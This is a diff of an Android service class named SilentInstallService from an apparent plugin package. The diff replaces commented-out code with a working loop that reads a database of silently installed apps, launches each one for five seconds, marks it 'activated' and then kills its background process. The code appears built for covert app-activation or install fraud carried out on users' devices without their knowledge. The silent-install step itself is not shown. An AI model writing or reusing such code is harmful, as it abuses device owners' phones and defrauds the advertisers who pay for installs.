@@ -6,7 +6,6 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
-import java.util.List;
 
 import android.app.ActivityManager;
 import android.app.Service;
@@ -20,13 +19,16 @@ import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.res.AssetManager;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
 import android.os.RemoteException;
+import android.os.SystemClock;
 import android.util.Log;
 
 import com.xstd.active.plugin.dao.SilenceApp;
+import com.xstd.active.plugin.dao.SilenceAppDao;
 import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
 
 public class SilentInstallService extends Service {
@@ -104,50 +106,42 @@ public class SilentInstallService extends Service {
 
     }
 
-    /**
-     * 停止激活程序
-     */
-    private void stopActiveApp() {
-        if (packageName != null) {
-            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-            am.killBackgroundProcesses(packageName);
-        }
-    }
-
-    private boolean active;
     private String packageName;
+    private boolean active;
 
     /**
      * 激活安装的程序
      */
     private void activeApp() {
+    	
         new Thread(new Runnable() {
             @Override
             public void run() {
                 active = true;
-                List<SilenceApp> sps = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).queryRaw("active=0");
-                Log.w("ps", sps.size() + "");
-                if (!active) {
-                    stopActiveApp();
-                    return;
+                SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
+                Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[]{String.valueOf(0)}, null, null, SilenceAppDao.Properties.Installtime.columnName + " ASC");
+ 
+                while (active && cursor.moveToNext()) {
+                	long id = cursor.getLong(0);
+                    String packname = cursor.getString(1);
+                    packageName = packname;
+                    Log.w("ps", "开始激活：" + packageName);
+                    Intent app = getPackageManager().getLaunchIntentForPackage(packname);
+                    startActivity(app);
+                    SystemClock.sleep(5000);
+                    SilenceApp entity = new SilenceApp();
+                    entity.setId(id);
+                    entity.setPackagename(packname);
+                    entity.setActive(true);
+                    dao.update(entity);
+                    if (packageName != null) {
+                    	Log.w("ps", "数据库修改完成，关禁程序。");
+                    	ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                        am.killBackgroundProcesses(packageName);
+                    }
                 }
-//                while (active && cursor.moveToNext()) {
-//                    String packname = cursor.getString(1);
-//                    packageName = packname;
-//                    Log.w("ps", "开始激活：" + packageName);
-//                    Intent app = getPackageManager().getLaunchIntentForPackage(packname);
-//                    startActivity(app);
-//                    if (!active) {
-//                        stopActiveApp();
-//                        return;
-//                    }
-//                    SystemClock.sleep(30000);
-//                    ContentValues values = new ContentValues();
-//                    values.put("active", 1);
-//                    db.update("SilentApp", values, "packname=?", new String[]{packname});
-//                }
-//                if (cursor != null)
-//                    cursor.close();
+                if (cursor != null)
+                    cursor.close();
             }
         }).start();
     }
